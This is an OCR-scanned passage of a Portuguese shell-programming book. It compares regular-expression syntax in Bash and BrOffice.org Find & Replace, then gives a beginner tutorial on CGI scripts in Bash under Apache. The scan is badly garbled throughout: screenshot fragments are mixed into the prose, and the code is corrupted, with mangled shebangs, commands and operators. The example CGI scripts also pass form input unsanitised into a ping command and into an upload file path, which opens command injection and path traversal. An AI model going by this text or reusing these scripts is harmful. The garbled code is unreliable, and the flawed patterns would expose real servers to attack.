início de uma linha, a expressão ~parece não irá localizá-la, pois parece 
somente aparenta estar no início da linha, mas se alterarmos o tamanho 
do seu fonte, por exemplo, a palavra não necessariamente estará mais 
lá situada. 
localizar e substituir 
erocurar por 
Assim·sendo.-mesmo·que·a· , 
início·de·uma·linha,·a·expre 
parece· somente·aparenta· 
o·tamanho·do·seu·fonte,·-
por·exemplo,·a·palavra·nào· 
.. 
BrOffice.org 3.1 
x 
Q Chave de pesquisa não locailada. 
Por outro lado, a Expressão Regular daqui . •ali, não irá casar o texto 
formado pelo daqui em um parágrafo até o ali em outro. Normalmente os 
parágrafos são tratados individualmente. 
u ·gostarta·de·encontrar11 
m·texto·que·viesse·daqui11 
té·all. ·mas· n ao·consegul.11 
·· 
Localizar e substituir 
erocurar por 
Além disso, o writer considera cada célula de tabela e quadro separa-
damente. Os quadros são examinados após todos os textos e células de 
tabela terem sido examinados. 
Na caixa de diálogo Localizar e Substituir, as Expressões Regulares 
devem ser usadas somente no box "Procurar por". Elas não podem ser 
usadas no "Substituir por:" porque Expressões Regulares casam com tex-
tos e portanto o que deve ser substituído é o texto e não a Expressão 
Regular. 
412 Programação Shell Unux 
Diferenças de sintaxe 
A partir de agora, veremos as diferenças de sintaxe entre o que apren-
demos nas Expressões Regulares do Bash e as que veremos do 
BrOffice .org. 
Âncoras 
Como já vimos, existe uma diferença na lógica de uso das Âncoras pois 
no Bash os metacaracteres de início <A> e de fim <Sl procuram respec-
tivamente os textos que os sucedem ou precedem no início ou no fim de 
uma linha. No BrOffice.org, essa procura é feita no início ou no fim de um 
parágrafo. 
Podemos também citar um caso que já foi reportado ao BrO-
ffice.org para correção. O alternativo ou ou < 1 l pode atrapa-
lhar o inicio <A> . Assim, pensando no mengão, se procurarmos 
I ·IW!ifi!·l Avermelholpreto, o BrOffice.org devolverá as ocorrências de 
vermelho iniciando parágrafos ou preto em qualquer lugar. Con-
tudo se fizermos: vermelho I Apreto serão devolvidos o vermelho 
e o Apreto, ambos em qualquer lugar, dessa forma não reconhe-
cendo o metacaractere " como a Âncora que marca o início de 
um parágrafo. 
Ué, mas não ramos falar sobre as diferenças de sintaxe? Sim, mas é 
bom frisar bastante este conceito de parágrafo porque isso algumas vezes 
me dá uma derrubada. 
Dentre as Âncoras, as únicas diferenças de sintaxe que existem no uso 
de Expressões Regulares no Bash e no BrOffice.org estão nos metaca-
racteres que definem as bordas. As contrabarras (\) , que são metaca-
racteres (escape) assumem, na pesquisa, uma função diferente quando 
seguidas por um menor (\<l ou um maior 1\>l . Vejamos: 
Para procurar palavras que começam por texto: 
• 
No Bash fazemos: \btexto; 
• 
No BrOffice.org fazemos: \<texto . 
Expressões regulares 
413 
Para procurar palavras que terminam por texto: 
• 
No Bash fazemos: t exto\b; 
• 
No BrOffice.org fazemos: texto\> . 
Exemplos: 
A Expressão Regular [a- 21 +e\>, neste exemplo, foi usada para procu-
rarmos por uma ou mais letras < (a-zJ + ) , terminando com a letra (e\>l . 
u vi um velho com um fol'! velho nas costas. Tanto ~ 
o~ 
do velho, 
uanto o velho do Iõli 'redq. 
. . 
, 
. 
m desafio: diga Isso bem rápido! 
Representantes 
Quase todos os metacaracteres Representante têm uso idêntico ao seus 
congêneres sob o Bash, porém nem tudo neste mundo é perfeito, por-
que, mesmo que poucas, ainda existem algumas diferenças de uso. 
Sob o Bash, todos os caracteres dentro de uma lista 1 1 1 1 são tratados 
como literais. exceto o circunflexo, que é tratado como um negador da lista 
(e assim mesmo quando ele é o seu primeiro elemento). Sob o BrOffice.org 
usamos a contrabarra 1\1 em uma lista para "escapar" alguns metacarac-
teres e também para formar códigos hexadecimais. 
Somente os caracteres abre colchetes 111 , hifen 1-l e contrabarra 
(\ > devem ser "escapados" no interior de uma lista, já que nesse ambiente 
seus significados são especiais. 
Por exemplo, a Expressão Regular !l\Ja-zJ casa um abre colchetes 
< 1 1 , ou um fecha colchetes < 1 1, ou uma letra minúscula. 1 \\1 casa com 
uma contrabarra literal, !\ t J casa com a letra • t •. Para casarmos um 
<TAB>, devemos fazer l\x00091 . que é a representação ascii em hexade-
cimal do <TAB>. 
Todos os outros caracteres são tratados pelos seus valores normais, não 
precisando de mais nenhum artifício. 
~la:cnu 
mJo 
414 Programação Shell Linux 
Usando Classes de Caracteres POSIX, surge um caso que tam-
bém já foi reportado, isso porque uma classe como 1 1: alpha : 11 
deveria casar com qualquer algarismo decimal, mas isso não se 
Jtiiillm verifica. 
Pelo site do BrOffice.org, este fato reportado funcionaria se fizésse-
mos 1 : alpha : 1, o que de cara já traz algumas restrições. Como exem-
plo suponha que eu queira procurar em um arquivo todas as letras mi-
núsculas e todos os algarismos decimais. Nesse caso, sob o BrOffice. 
org, não poderia usar Classes de Caracteres POS IX. No Bash faríamos 
11 :lower : 11 :digH : 1 1, mas isso no BrOffice.org é impossível, pois, em 
virtude dos colchetes < 1 1 > mais externos, ele encararia isso como uma 
lista formada de todos os caracteres internos a esses colchetes 1 11 > e 
não como duas classes. 
Da mesma forma, também não funcionaria 
!a-zl :digit : 11. 
nem 
1 1: lower : 1 o-91 . A saída seria usarmos uma lista de caracteres, mas assim 
mesmo, veja só isso: 
· 
Localizar e substibJir 
x 
Viu! Nesse caso as letras acentuadas não casaram com o nosso 
padrão. 
Por outro lado, pela facilidade que tenho no uso de Expressões Regu-
lares, venho há muito tempo testando-as no BrOffice.org, e não sei se por 
erro meu, mas até a versão em que estou escrevendo este documento 
(3.1.1 ), não consegui casar 1 :digit : 1 nenhuma vez. Veja: 
Erocurar por 
~la:cnu 
mJo 
Expressões regulares 
415 
I [:alpha:Ji-(0·91 
l,ocalizar 
frocurar por 
Duas observações: 
1. Usando a classe 1 : alpha : 1, conseguimos casar as letras acentuadas; 
2. A classe r :digit: 1 não funfou! 
Resumindo: essa facilidade ainda está em fase de consolidação e, por 
isso, sempre que posso usar as listas convencionais (como no caso de al-
garismo}, não penso duas vezes, uso-as. 
Quantificadores 
Aqui não há o que temer nem acrescentar. Os Quantificadores do BrOffice. 
org se comportam da mesma forma que os do Bash. Poupe seu fôlego para 
a seção seguinte. 
Outros 
Aqui a porca torce o rabo! Nesta classe de metacaracteres existem diferen-
ças substanciais no uso de Expressões Regulares, a começar pelo que já 
vimos, de uma Âncora sucedendo um ou 1 1) . Recapitulando: 
Se procurarmos Avermel ho 1 preto, o BrOffice.org devolverá as ocorrên-
cias de vermelho iniciando parágrafos ou p reto em qualquer lugar. Contu-
do, se fizermos: vermel ho 1 Apreto serão devolvidos o vermel ho e o Apreto, 
ambos em qualquer lugar, desta forma não reconhecendo o metacaractere 
A como a Âncora que marca o início de um parágrafo. 
Vamos ver como funcionam os grupos e os retrovisores: como já sabemos, 
os grupos são criados com o uso de parênteses. Os textos casados (veja bem, 
são os textos e não as Expressões Regulares) ficam guardados e podem ser 
recuperados dentro da mesma Expressão Regular. No exemplo a seguir, pro-
curamos por duas palavras iguais, separadas por um hífen H . Veja: 
416 Programação Shell Linux 
--------------------
·obra· tinha· um1bat<f!illtij·constante'.l 
localizar e substituir 
frocurar por 
A Expressão Regular era a seguinte: 
\<([a-:;;)+)-\1\> 
Onde: 
• 
\< e \> Formam a borda esquerda e direita do texto, respectivamente; 
• 
r ra-zJ+l Define uma ou mais letras seguidas (palavra) dentro de um 
grupo; 
• 
- \1 O hífen seguido do texto casado pelo grupo. 
Até agora não mudou nada do que foi dito sobre Expressões Regu-
lares no Bash e tudo funcionou às mil maravilhas. Mas se você prestar 
atenção, o que fizemos foi clicar em um dos botões de localizar. A dife-
rença começa quando desejamos usar o texto casado para substituir 
alguma coisa. 
Vamos aproveitar este exemplo para trocar bate-bate por bater : 
·obra· tinha· um· bater·constante 11 
Locnllzar c substituir 
erocunv por 
Repare que na caixa "Substituir por" eu usei $Ir, ou seja, o texto casa-
do não é mais o \l, agora é o $1. 
Eu odeio mesóclises e tinha o seguinte texto: 
Expressões regulares 
417 
ar-se-ia11 
·· 
Localizar e substituir 
x 
frocurar por 
l,oc.õlizar 
- --
LOC]Iizar todos I 
~ 
Substitui< I!« 
Substituir 
: Substlluir lo!los I 
Este dar-se-ia estava me torturando, então troquei-o usando uma Ex-
pressão Regularem que eu montava 3 grupos separados por hifen H . En-
tão, o primeiro <~ll recebeu dar, o segundo tS21 recebeu se e o terceiro 
(S3l recebeu ia . Colocando-os na ordem que eu queria (5153-$21 , veio: 
Localizar e substituir 
erocu....-por 
Loca!lzar 
Esta sintaxe pode parecer estranha, mas não é, ela é semelhante à usa-
da na linguagem Perl. 
Duas observações sobre o uso de cifrão <SI para substituir texto: 
1. Se no seu texto tem um valor 123, 45 e você desejar substituí-lo por 
RS123, 45 você deverá colocar na caixa "Substituir por" R\$123, 45, 
veja: 
Localizar e 
r 
~la:cnu 
mJo 
418 Programação Shell Unux 
O primeiro grupo casou tudo até a vírgula (, > e o segundo ficou 
com o resto do número. Na substituição, o primeiro cifrão foi prece-
dido por uma contrabarra (\$) para especificar que era um literal. 
2. O $0 na caixa "Substituir por" substitui por todo o texto casado. 
A contrabarra (\) nas Expressões Regulares do BrOffice.org também 
tem suas peculiaridades: 
\t 
quando fora de uma lista equivale a um <TAB> . Como já foi dito, 
dentro de uma lista, o <TAB> deve ser usado com seu código hexa-
decimal [ \ x0009 1 . 
Então para trocar todos os <TAB> por espaços em branco, ponha na 
caixa "Procurar por" um \t e na caixa "Substituir por" um espaço 
em branco; 
\n 
casa com um hard enter ou new tine (-l) (formado por um 
<SHI FT>+<ENTER>). 
Suponhamos que você tenha vermelho seguido de um hard enter 
e na linha seguinte preto, se na caixa "Procurar por" colocar ver-
melho\npreto e na caixa "Substituir por" colocar vermelho- e-preto, 
após a substituição, o hard enter terá morrido, sobrando vermelho-
e-preto. O mesmo poderia ter sido feito colocando nas caixas \n e 
-e-, respectivamente; 
$ 
casa com uma marca de parágrafo (). 
Diferentemente do hard enter, não podemos definir na caixa "Pro-
curar por" a cadeia no início da linha seguinte um uma Expressão 
Regular que case com ela. Assim sendo, não poderíamos agir como 
no exemplo anterior, preenchendo as caixas com vermelho\npreto 
e com vermelho-e-preto respectivamente, porém funcionaria se as 
caixas fossem preenchidas com $ e com -e-. 
\x 
quando temos um \xNNNN, onde NNNN são algarismos hexadeci-
mais [0-9A- Fa-f l na caixa "Procurar por", o BrOffice.org localizará 
(e eventualmente trocará) o caractere definido pelo código hexade-
cimal formado por NNNN . Se esse código estiver na caixa "Substituir 
por", será tratado como um literal. 
Expressões regulares 
419 
Isso me lembra um macete de edição que uso. Ao longo de um 
texto grande, escrevemos diversos ordinais como 2' . Isso pode ser 
feito em Inserir --. Caractere especial, mas fazer isso um monte de 
vezes num texto enche o saco. Como faço? Para fazer 2 • , como 
disse, escrevo 2 . a. e assim vou fazendo com todos os ordinais até 
terminar de escrever o documento. 
Ao final, coloco na caixa "Procurar por" a Expressão Regular 
< [o- 91 1 \ .a\ . • e na caixa "Substituir por" coloco um sl'. ou seja 
o texto que casou com o grupo (um algarismo) seguido do ordinal. 
Em seguida clico em "Substituir todos". Repito mais uma vez esta 
operação para substituir os ordinais masculinos, como em 12- . 
Vou terminar esse texto com uma dica que demorei muito para descobrir. 
Ela é muito útil quando se copia um texto de um navegador e se cola no BrO-
ffice.org. Normalmente, o novo texto fica com um monte de hard enter (JI , 
não é? 
Se você quiser trocar todos hard enter (J) por um parágrafo 
(i J , primeiramente localize todos os /n, clicando em "Substi-
tuir todos". Agora coloque na caixa "Substituir por" o mesmo 
/ n, já que nesta caixa ele equivale ao parágrafo. Agora basta 
clicar em "Substituir todos". Bizarro ... 
Como você viu, ainda existem algumas coisas a serem acertadas e ou-
tras a serem feitas, mas o concorrente direto do BrOffice.org, o MS Office, 
nem sonha ter Expressões Regulares. Creio que essas pequenas altera-
ções e incrementos sejam sanados com a nova versão (bastante modifica-
da), descrita em http://userguide. icu-project.org/strings/regexp. 
Mate 
com d re l s 
l • s 
Apêndice 3 
CGI em Shell Script 
CGI (Common Gateway lnteJtace) é um serviço server-
based que adiciona funcionalidade extra a uma página. 
Essa funcionalidade é fornecida por um 'pequeno' pro-
grama ou script que é executado no servidor onde a 
página web fica. Esses programas podem ser feitos em 
diversas linguagens como Perl, PHP, C, She/1 Script, 
etc. 
Como gosto muito de She/1 Script, resolvi escrever um 
tutorial básico sobre como fazer CGI em She/1. Isso tem 
várias vantagens, você pode utilizar vários comandos do 
UNIX para ajudar a construir seu script, por exemplo, sed, 
awk, cut, grep, cat, echo, etc. além dos recursos do pró-
prio She/1. 
OK, como este tutorial não vai ser muito grande, vamos 
direto ao ponto. 
Configuração 
Como configurar o servidor web Apache para executar 
CGI? 
CGI é um módulo do Apache, assim ele precisa ser 
carregado. A maioria das distribuições já vem com o seu 
h ttpd . conf configurado com suporte ao módulo do CGI 
420 
Mate 
com d re l s 
l • s 
CGI em Shell Scrlpt 
421 
lmod_cgi) , bastando apenas iniciar o Apache. Para se certificar procure e, 
se for o caso, descomente a seguinte linha no seu htcpd .cont : 
LoadNodule cgi_ module /usr/l ib/apachc/1.3/mod_ c gi . so 
Note que a terceira coluna pode variar dependendo da versão do Apache e 
da distribuição que você está usando. 
Existem diversas maneiras de configurá-lo: 
1. ScriptAiias 
Essa diretiva define um diretório para o Apache onde serão armazenados 
os scripts CGI. Todos os arquivos que estiverem nesse diretório serão inter-
pretados pelo Apache como programas CGI, assim ele tentará executá-los. 
Adicione ou descomente a seguinte linha no seu arquivo httpd.conf 
ScriptAlia s /cgi - bin / /usr/l i b/c9i - bin / 
O exemplo acima instrui o Apache para que qualquer requisição come-
çando por /cgi- bin/ deva ser acessada no diretório /usr/lib/cgi -bin/ e 
deva ser tratada como um programa CGI, i.e., ele irá executar o arquivo 
requisitado. 
Se você acessar por exemplo http: I /localhost/cgi- bi n/meu scr ipt . cgi, 
o Apache irá procurar este arquivo em /usr/lib/cgi- bin/meu_scnpt . cgi 
e tentará executá-lo. 
2. Fora do ScriptAiias 
Você pode especificar um diretório particular e dar permissão para a exe-
cução de CGis. 
<Dir Gctory /homG/usGr /public_hcml/cgi- bin/> 
Opt ions +E:..-;ecCGI 
</Di rectoJ::y> 
A diretiva acima permite a execução de CGis, mas você ainda precisa avi-
sar o Apache que tipo de arquivos são estes CGis. Procure por uma linha 
igual ou semelhante a esta no seu httpcl .conf e descomente. 
AddHandler cgi-script .cgi . sh .pl 
~1atcria com d r bs auto a.~s 
422 Programação Shell Linux 
Se você colocar um index.cgi em algum diretório e quiser que por 
default o Apache o execute, não se esqueça de adicionar esta 
•
~.-::-. extensão no seu Directorylndex. 
iãim:ml 
<IfModule mod_dir. c> 
Directo ryindex index .ht.ml index.htm i ndex . shtml i nde>:.cqi 
</IfNodule> 
O Apache irá procurar pelo i ndex . cogi seguindo a ordem dos argumentos, 
ou seja, o index.cgi será a última opção que ele irá procurar no diretório. 
Algumas considerações importantes 
Você não deve colocar seus scripts no d ocument 
r oot do Apache, 
porque alguém pode pegar seus scripts, analisá-los procurando fu-
ros de segurança, etc. Além do mais, o código do script não é o que 
você quer mostrar. Então mantenha-os em /usr/lib/cgi-bin ou em 
algum outro diretório fora do document 
root. 
O script precisa ser um executável, não se esqueça de dar um chmoci 
nele. Ah, certifique-se de que o script tem permissão de execução 
para o usuário que o Apache está rodando. 
Diversão 
Iniciando 
Assumimos que vocé já tem o seu servidor web configurado para executar 
CGI. 
O básico que você precisa saber é que toda saída padrão (stdout) do 
seu script vai ser enviada para o browser. 
O exemplo maís simples é você ímprímír algo na tela (o famigerado Helio 
Worfd eu não aguento mais!!). Vamos ao nosso exemplo: 
$ eat simplos . egi 
11 ! / bin/bash 
echo "content-type : text/plain" 
echo 
echo "vamos ver se isto f unciona mesmo : -) " 
~1atcria com d r bs auto a.~s 
CGI em Shell Script 
423 
echo 
echo "hnun, parece legal" 
echo 
echo -e "igual ah um shell normal \n<b>tag html</b>" 
Feito isso, basta acessar o nosso arquivo http : 1 /localhost/cgi-bin/ 
simples .cgi. Ah, não se esqueça de colocar permissão de execução no 
arquivo. 
OK, então percebemos que toda saída do nosso script é enviada para o 
browser, toda saída mesmo. Por exemplo, podemos utilizar a saída de um 
comando: 
$ eat saida_cmd.cgi 
~ ! /bin/bash 
echo "content.- type : text/plain '• 
echo 
echo "uname -a" 
echo 
uname -a 
Quando utilizamos CGI, o servidor coloca diversas informações sobre o 
cliente e o seNidor em variáveis de ambiente. Dentre essas informações 
pode-se destacar: 
Variável 
DOCUI1ENT_ROOT 
t!TIP..ACCEPT 
Informação provida 
Diretório root dos documentos html 
Quais os content-t ype suportados pelo 
navegador do cliente 
HTIP _HOST 
Nome do host do servidor 
t!TIP _USER..AGENT 
O navegador do cliente 
--~~~~~~------------~ 
REMOTE..ADDR 
IP do cliente 
REQUEST _URI 
Página requisitada 
----~~~~~--------------~ 
SERVER..AODR 
IP do servidor 
SERVER..I'IAME 
O nome do servidor (configurado no apache) 
----------------~--~------~--"--~ 
SERVER..PORT 
Porta que o servidor está escutando 
SERVER..SORTWARE 
Sistema operacional e servidor www rodando 
no servidor 
424 Programação Shell Linux 
O exemplo a seguir mostra todas as variáveis. 
$ c a t expor t . cqi 
í# ! /!Hn/b~sh 
echo 
"cont~nt - type
: 
t.eY.t/l:llain" 
echo 
echo "Informacoes cp.te o servidor coloc a en\ vari avt>is de ambi ente" 
echo "Pat a 
ve.~: ut1liz a.roo$ o comando s e t.'' 
echo 
set 
OK. no protocolo http temos que enviar um cabeçalho obrigatório. O 
primeiro echo sem string dentro de um script vai avisar o browser para 
interpretar o que veio antes como cabeçalho. Nos exemplos anteriores, a 
seguinte linha: 
content - type: 
~ext/pla1 n 
informa ao navegador para interpretar o que receber como texto puro. 
Se o cabeçalho não possuir nenhuma linha, ou seja, colocarmos somen-
te um echo, será utilizado o default que é t ext /plain . 
Para enviarmos tags html e o navegador interpretá-las, temos que utili-
zar um cabeçalho diferente. 
Então vamos enviar tags html para deixar nossa saída mais bonita: 
$ cat sobre.cg"i 
i ! /bln/bash 
ec ho "<:ontent-- typc : t<':Xt/html .. 
echo 
echo 
echo " 
<htrnl> <hêAd> <ticle> CGI scrip~ </t i t l é > </head> 
<body> 
<hl>J~lgutM:3 i nfortilll(FÔ(:IS sobrt:! a maqui na que o CG! está rodando :</hl> 
echo 
" <h4>upt~rr.-t </h4 > " 
echo "<pre>$ (upti me) </pre >" 
echo "<h -4>unCtmc</h4>" 
echo ''<pre>$ (uname -a) </p.re> " 
Mate 
com d re l s 
1 • s 
echo "<h4>/proc/cpuinfo</h4>" 
echo "<pre>S(cat / proc/cpuinfo)</pre>" 
echo " 
</body> 
</html> 
CGI em Shell Script 
425 
Um exemplo mais interessante seria como fazer um contador de acesso. 
A cada execução do script o contador será incrementado, não importan-
do se é uma solicitação de reload de um mesmo endereço IP! 
Isso é simples. Veja o exemplo: 
$ cat contador.cgi 
1 !/bin/bash 
echo "content- type : text/html" 
echo 
echo 
echo "<html> <head> <tüle> CGI script </title> </head>" 
echo "<body> " 
ARQ-"/tmp/page .hits " 
n•"S(cat SARQ 2> /dev/nulll " I I n=O 
echo S ( (n=n+l)) > " SARO" 
echo " 
<hl>Esta página já foi visualizada : Sn vezes</hl> 
<br> 
</body> 
</html>" 
Com o que você sabe até agora, dá (ops!) para fazer vários scripts le-
gais, fazer monitoramento do sistema, de sua rede ... , tudo via web. 
Agora que já aprendemos o básico, queremos interagir com o usuário. 
Nesse ponto nós temos um detalhe, pois o nosso script não pode usar 
e entrada padrão (stdin) para receber dados e não podemos fazer um 
read em um CGI, pois como nós leríamos o que o usuário digitasse no 
teclado? :) 
426 
Programação Shell Unux 
Para realizar esta interação existem duas maneiras. 
1. Através da URL, utilizando o método GET , como por exemplo: 
http ://localhost/cgi-bin/script . cgi?user=nobody&profissao=vaga 
(veremos mais sobre o método GET adiante) 
2. Utilizando um formulário html. No form podemos utilizar dois métodos. 
o GET e o POST . No método GET, que é o defau/t, os campos de input 
do form são concatenados à URL. Já no método POST, os inputs são 
passados internamente do servidor para o script pela entrada padrão. 
Método GET 
Usando o método GET, o nosso script deve pegar os inputs do usuário 
via uma variável de ambiente, no caso a $QUERY STRING . Tudo o que vie: 
após o caractere · ? • na URL será colocado naquela variável. Os campos 
de input do form são separados pelo caractere • & • e possuem a seguinte 
construção: name=value . 
Vamos a um exemplo de um CGI que recebe como entrada um host que 
será executado no ping . 
$ cat ping_get.cgi 
t!/bin/bash 
echo "content- type : text/ html " 
echo 
echo 
echo " 
<html> <head> <title> CGI script </ title> </head> 
<body> 
" 
echo "<h2>Exemplo de uso do GET</h2>" 
if f "SQUERY_STRING" ) ; then 
echo "QUERY_STRING 
SQUERY_STRING" 
host="$(echo SQUERY_STRING I \ 
sed ' s/\( .*•\)\( .*\)\(\i . *\)/\2/ ' ) " 
echo "<br>" 
echo "Disparando o cmd ping para o host <b>Shost</b>" 
echo "<pre>" 
9ing - c5 $host 
echo "</pre>" 
CGI em Shell Scrlpt 
427 
echo " Fim." 
el se 
fi 
echo " 
<f orm mcchod•\ "GET\" act:ion • \ "pi n9_9et .cgi\"> 
<b>Entro com o nome ou IP do hosc par a o p i ng: </b> 
<i nput size=-40 name=-host. value=\'"\ "> 
<input t.ype=hidden size=-40 name=t:esce value=\"nada\"'> 
</form>" 
echo "</body>" 
echo "</html'>" 
Método POST 
No método rosT, as opções do form não são passadas pela URL, elas são 
passadas internamente do servidor para o CGI. Desse modo, com esse 
método o nosso script deve ler as opções pela entrada padrão. Vamos a 
um exemplo em que o CGI envia um mail para alguém através da página. 
Neste caso, um pouco mais complexo, temos dois arquivos. O primeiro um 
.html puro, onde construímos o form, e colocamos como opção aceion o 
nosso script. A opção act ion passada no form indica qual script será cha-
mado para tratar os dados passados pelo form. 
$ cat contato. html 
<ht~> <hê~d> <titl é> CGI scri pt 
</~i tlé> </héad> 
<boây> 
<form method="post '' ac;:tion=" /cg i-b i n/contato. cg.t "> 
Nome :<br> 
<input type=" text" name="name,. maxlength=-"50" size=-"30"> 
<p> 
E-mail : <br > 
<input ty-pe• "text" name• "(1ddress " maxlenqt h• "SO" size• ''30"> 
<p> 
Selecione o assunto: 
<select name="subject"> 
<option valuee "none" >- - - --- --------- - ---- -----
<option value• ''venda "> I nformaçõe:s ~ob.re. produto 
<opti oh value• ''supol:"te" >Supo:rte técni co 
<opt.ion vAlue=''web">Probl etna no sit.e 
</sél êct> 
<p> 
sua mensagem: <br> 
~1atcria com d r bs auto a.~s 
428 Programação Shell Linux 
<textarea name="rr.essac;e" wrap•"physical " rows- "'6"' cols="50"> 
</textarea> 
<p> 
<input type="submit " value•"Enviar Mensagem''> 
<input.. t.ype="reset" value• .. Limpar"> 
</form> 
</body> 
</html> 
Agora o nosso script lê da entrada padrão e faz o tratamento necessá-
rio. Note que, para enviar o mail, podemos utilizar qualquer programa de 
mail , por ex., o mail sendmail ... 
$ cat contato.cgi 
~! /bin/bash 
meu_mail "user@localhost . com . br" 
echo "content- type : text/html " 
echo 
echo 
echo "<html> <head> <title> CGl script </t~tle> </head>" 
echo "<body>" 
VAR•S(sed -n ' lp ' ) 
echo "SVAR" 
nome•S(echo SVAR I \ 
sed ' s/\(name=\)\( . •\)\(\&address•.'\)/\2/ ;s/+/ /g ' ) 
mail•S(echo SVAR I \ 
sed 
' s/\( . '&address•\)\( .' \)\(\&subject• .· \)/\2/ ; s/\~0/@/ ' ) 
subj•S(echo SVAR 
\ 
sed ' s/\( .•&subject•\)\(.• \)\(\&message•.•\)/\2/ ' ) 
text•S(echo $VAR 1 sed ' s/ .• \&message•// ' ) 
echo "<br> 
<br><b>Nome :</b> $nome 
<br><b>mail :</b> Smail 
<br><b>Subject :</b> Ssubj 
<br><b>~1essage : </b> Stext. 
<br>" 
mail -s "Mail from CGI " "Sn'eu mail " < S (echo -e " 
Nome : $nome 
mail : Smail 
Subject : $subj 
Message : $text") 
echo "</body>" 
echo "</html>" 
CGI em Shell Script 
429 
Não esqueça que caracteres especiais como <TAB>, 
<ENTER>, 
<espaço>, +, 
&, 
@ •• • ,serão codificados para ser possível sua 
transmissão entre o navegador e o servidor. 
Quando o seu servidor web envia os dados do FORM para o seu CGI, 
ele faz um encode dos dados recebidos. Caracteres alfanuméricos são en-
viados normalmente, espaços são convertidos para o sinal de mais (+) , 
outros caracteres como tab, aspas são convertidos para o/oHH, onde HH 
são dois dígitos hexadecimais representando o código ASCII do caractere. 
Esse processo é chamado de URL encoding. 
Tabela para os caracteres mais comuns: 
~ 
Caractere 
URL Encoded 
r 
\~ (tab) 
%09 
,-
\n (return) 
%O A 
I 
%2F 
•· 
-
%7E 
: 
%3A 
-
; 
%38 
@ 
%40 
& 
%26 
Aqui vão dois links para fazer e desfazer essa conversão. 
http://www.shelldorado.com/scripts/cmds/urlencode 
http://www.shelldorado.com/scripts/cmds/urldecode 
Upload 
Agora que já sabemos utilizar os métodos GET e rosT vamos a um exemplo 
um pouco diferente. Vamos supor que precisamos fazer um CGI que per-
mita ao usuário fazer um upload de um arquivo para o servidor. Aqui utiliza-
430 Programação Shell linux 
mos um form um pouco diferente. Falamos para o form utilizar um tipo de 
codificação diferente, no caso enctype="mult:ipart/form- data". Criamos 
um html normalmente e como opção do action colocamos o nosso script. 
$ cat upload.html 
<html> 
<body> 
<form enctype~"mult:ipart/form-dat:a " 
action=" /cgi-bin/upload .cgi " method="post."> 
Enviar arquivo : <input name="useríile" size•"30 " 
typea"file"> 
<BR><SR> 
<input type="submit" valuee"Envia" name="Envia "> 
</form> 
</body> 
</html> 
O nosso script é quase igual a um POST normal. A principal diferença é 
que a entrada para o script não vem em uma única linha, e sim em várias. 
Quem faz isso é o enctype="multipart/form-data". Vem inclusive o con-
teúdo do arquivo via POST ! Então pegamos tudo da entrada padrão. Note 
que junto com entrada vêm otras cositas más =8) Vamos a um exemplo: 
$ cat upload.cgi 
ij!/bin/bash 
echo "cont:ent:-t:ype: text/html " 
echo 
echo 
echo "<ht:ml> <head> <title> CGl script </title> </head>" 
echo "<body><pre>n 
# descomente se quiser ver as variaveis de ambiente 
!export 
~ ele separa as varias partes do roru1 usando 
um limite (boundary) que eh diferente a 
# cada execucao . Este limite vem na variave1 
! de ambiente CONTENT_TYPE algo mais ou menos assim 
i CONTENT_TYPE="multipart/form-data ; boundary• --------------
1086400738455992438608787998" 
! Aqui pegamos este limite 
boundary•S(export I sed ' /CONTENT_TYPE/!d;s/' . 'dary=//; s/ . $// ' ) 
fecho 
fecho "boundary = $boundary" 
i pegamos toda a entrada do POST e col ocamos e1n VhR 
VAR•S(s~d -n ' l ,$p ' ) 
tt irnpr i mi mos o que ve1n no i nput 
ccho "$VAR"' 
echo -e '\n\n' 
CGI em Shell Script 
431 
echo ":===========-·===-== F'lM =-======================·======" 
echo - e ' \n\n' 
j peqamos o nome do arquivo quê foi fêieo o upload 
FILENI\NE~* (echo " SVI\R" I \ 
sed -n ' 2!d: s/\( . *óilen arne;\ "\) \ ( . *\) \ " . *$/\2/; p') 
~ pegamos somente o conteudo do arquivo do 1.1pload 
FILE;Hecho "SVIIR" I sed - n "1,/Sboundacy/p" I se<l ' l,M;Sd ' ) 
ccho 
" ~fome do t1tquivo : .$FILENAHE" 
echo 
@ in\p rimi mos no btowscr o cont.eudo do .arquivo 
echo '' SFI L E" 
j r ed.i. reci onamos o contcudo do arquivo pa.ra 
# um arquivo local no server upload feieo ; ) 
~cho " $ F I LE" J 3ecl '$cl' > "/tmp/SF!!.EN.liJI!E" 
ec ho " <f!ne></body:></ html>" 
CheckBox 
Para relaxar, um exemplo mais simples: vamos fazer um checkBox. Pri-
meiro, criamos uma página html com o form para checkbox normalmente. 
Vamos utilizar o método I'OST no exemplo. 
$ cat checkbox.html 
<ht ml><head><t itle>distro</title></bead> 
<boây> 
< foz::m <tction="/c9J.- bi n /ch cckb ox . cgi" method=" POS1""> 
<h3>Quais dest as dist t:o voce gosta ?<lh3> 
<input 
t.j--pe=" chee l~box'' name="debian .. value=l> Dtlbian<br> 
<i nput type:=="checkbox" name;" tedhat"' v alue;;; l > Redfla"t.<br> 
<ir.put: t.ype=''checkho>:" name="conectiva" valu.e= l> Conect J.v~<br> 
<i nput type•"checkbox" name• "mandrake" value•l > Nandrake<br> 
< i nput type="submit" value="Enviat"> 
</form> 
</body> 
</html > 
Mate 
com d re l s 
1 • s 
432 Programação Shell Linux 
Pegamos as entradas do form na entrada padrão. Eles são separados 
por & • Todas as opções que o usuário selecionar virão no rosT. Ah, não 
se esqueça. name=value . Um exemplo de entrada que receberemos: 
debian·l~conectiva•l 
Assim, sabemos que o usuário escolheu essas duas opções. Basta fazer 
o script. 
$ cat checkbox .cgi 
1!/bin/bash 
echo "content-type : text/plain " 
echo 
VAR•S(sed -o lp) 
echo "SVAR" 
echo 
( "$\lAR" I li ( echo "voce nao gos:a de nada"; exlt; J 
echo "Vore gosta de :" 
echo 
IFS•"&" 
for i in echo "SVAR" · 
do 
echo " Slecho Si I cut -d• -fl) " 
done 
Radio Buttons 
Outro exemplo é o Radio Buttons. Também utilizaremos o método rosT 
aqui. Criamos um HTML normalmente. 
$ cat radiobuttons.html 
<html><head><title>distro</title></head> 
<body> 
<form action•"/cgi-bin/radiobuttons .cgi " method•"POST"> 
<h3>Qual sua distro predileta ?</h3> 
<input type•"radio" name•"distro" value•Oebian> Debian<br> 
<input type•,. radio .. name=''distro" value•RedHat> RedHat<br> 
<input type "radio" name="distro" value Conectiva> Conectiva<br> 
<input type "radio" name="distro" value•Mandrake> Mandrake<br> 
<input type "r adio" name= .. dist.ro" value•none> Nenhuma destas<br> 
<input type•"submit" value•"Enviar ""> 
</form> 
</body> 
</html> 
CGI em Shell Script 
433 
O que será enviado pelo POST é a entrada escolhida. Como é Radio 
Buttons, somente uma opção é aceita, assim temos a entrada: name=value, 
